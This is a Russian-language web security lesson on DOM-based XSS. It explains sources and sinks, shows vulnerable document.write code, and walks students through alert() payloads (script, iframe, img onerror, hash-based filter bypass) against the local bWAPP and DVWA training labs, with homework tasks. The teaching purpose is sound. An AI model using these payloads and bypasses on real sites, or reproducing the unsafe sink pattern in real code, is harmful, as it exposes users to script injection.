# Занятие 21. XSS (DOM-based): Отличия и поиск в bWAPP

## Теория

**DOM-based XSS** — это тип XSS, при котором уязвимость находится в клиентском JavaScript-коде, а не на сервере.

### Отличия от Reflected/Stored XSS

| Тип | Где уязвимость | Как попадает в DOM | Виден ли в HTML-ответе сервера |
|-----|----------------|-------------------|-------------------------------|
| Reflected | Серверный код | Через параметры URL/формы | Да, скрипт в HTML-ответе |
| Stored | Серверный код + БД | Сохраняется на сервере | Да, скрипт в HTML-ответе |
| DOM-based | Клиентский JavaScript | Через DOM (location, document.write) | Нет, скрипт не в HTML-ответе |

### Механизм DOM XSS

1. JavaScript на странице читает данные из DOM (например, `location.search`, `document.URL`, `document.referrer`)
2. Данные без проверки передаются в опасные функции (например, `innerHTML`, `document.write`, `eval`)
3. Атакующий манипулирует DOM-источником (обычно через URL)

### Опасные источники (Sources)

- `document.URL`
- `document.documentURI`
- `location.href`
- `location.search`
- `location.hash`
- `window.name`
- `document.referrer`

### Опасные приемники (Sinks)

- `innerHTML` / `outerHTML`
- `document.write()` / `document.writeln()`
- `eval()` / `setTimeout()` / `setInterval()`
- `jQuery.html()` / `jQuery.append()`
- `location` / `location.href`

### Пример уязвимого кода

```javascript
var pos = document.URL.indexOf("default=") + 8;
var default = document.URL.substring(pos, document.URL.length);
document.write("Page: " + default);
```

Если URL: `http://site.com/page.html?default=<script>alert(1)</script>`, код выполнится.

### Почему DOM XSS сложнее обнаружить

- Пейлоад не отправляется на сервер (или отправляется, но не сохраняется в ответе)
- Серверный WAF/фильтры не видят пейлоад
- Нужно анализировать клиентский JavaScript

---

## Практическое занятие

### Настройка bWAPP

1. Откройте http://localhost (bWAPP)
2. Войдите: bee / bug
3. В выпадающем списке выберите **XSS - DOM (Resource interpretation)**
4. Установите уровень **low** и нажмите **Hack**

### Практика: DOM XSS в bWAPP

**Шаг 1: Базовый пейлоад через URL**
```
URL: http://localhost/xss_dom.php?default=<script>alert(1)</script>
```
Результат: всплывает alert(1).

**Шаг 2: Использование iframe**
```
URL: http://localhost/xss_dom.php?default=<iframe src="javascript:alert(2)"></iframe>
```

**Шаг 3: Использование img (если script заблокирован)**
```
URL: http://localhost/xss_dom.php?default=<img src=x onerror=alert(3)>
```

**Шаг 4: Анализ исходного кода**
Откройте DevTools → Sources → xss_dom.php. Найдите JavaScript-код, который обрабатывает параметр `default`.

Часто это выглядит так:
```javascript
var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
```

**Шаг 5: Обход фильтра через события**
Если `<script>` отфильтрован:
```
URL: http://localhost/xss_dom.php?default=#<img src=x onerror=alert('DOM XSS')>
```

### Поиск DOM XSS с помощью DevTools

1. Откройте DevTools → Sources
2. Поставьте точку останова (Breakpoint) на `document.write` или `innerHTML`
3. Обновите страницу с пейлоадом
4. Смотрите стек вызовов (Call Stack) — откуда пришли данные

### Практика в DVWA (DOM XSS)

В DVWA перейдите в **XSS (DOM)**.

**Пейлоады:**
```
URL: http://localhost/vulnerabilities/xss_d/?default=English<script>alert(1)</script>
URL: http://localhost/vulnerabilities/xss_d/?default=English<img src=x onerror=alert(1)>
```

Посмотрите исходный код страницы (Ctrl+U) — пейлоад НЕ будет в HTML. Он обрабатывается только JavaScript.

### Скриншоты для отчета

1. **Скриншот 1**: bWAPP DOM XSS — alert(1) сработал
2. **Скриншот 2**: Исходный код страницы (Ctrl+U) — показать, что пейлоад отсутствует в HTML
3. **Скриншот 3**: DevTools → Sources — фрагмент JavaScript-кода с уязвимостью

---

## Задачи для самостоятельного выполнения

1. **Поиск источника в bWAPP**: В уязвимости **XSS - DOM (Resource interpretation)** в bWAPP (low) найдите в исходном коде страницы JavaScript-код, который обрабатывает параметр `default`. Укажите в отчете: название файла, номер строки, какая опасная функция используется (innerHTML, document.write и т.д.).

2. **DOM XSS в DVWA**: На уровне Low в DVWA (XSS DOM) выполните пейлоады:
   - `?default=<script>alert(1)</script>`
   - `?default=<img src=x onerror=alert(1)>`
   - `?default=#<script>alert(1)</script>`
   
   Какой пейлоад сработал? Почему некоторые не работают? Посмотрите исходный код через Ctrl+U.

3. **Обход через hash**: В DOM XSS часто можно обойти фильтры, используя `location.hash` (часть URL после #). Попробуйте пейлоад:
   ```
   ?default=#<script>alert('hash')</script>
   ```
   Сработал ли он? Почему символ `#` может помочь обойти фильтры?

4. **Поиск DOM XSS с помощью инструментов**: Используйте браузерный плагин **DOMinator** или расширение **XSS Hunter** (или вручную через DevTools) для поиска источников и приемников в bWAPP. Найдите как минимум 2 разные уязвимости типа DOM XSS в bWAPP. Опишите, где они находятся.

5. **Сравнение типов XSS**: Создайте таблицу, сравнивающую Reflected, Stored и DOM XSS:
   - Где находится уязвимость (сервер/клиент)
   - Нужен ли сервер для атаки
   - Виден ли пейлоад в ответе сервера (View Source)
   - Какой тип опаснее и почему
   
   Заполните таблицу на основе ваших экспериментов в DVWA и bWAPP.
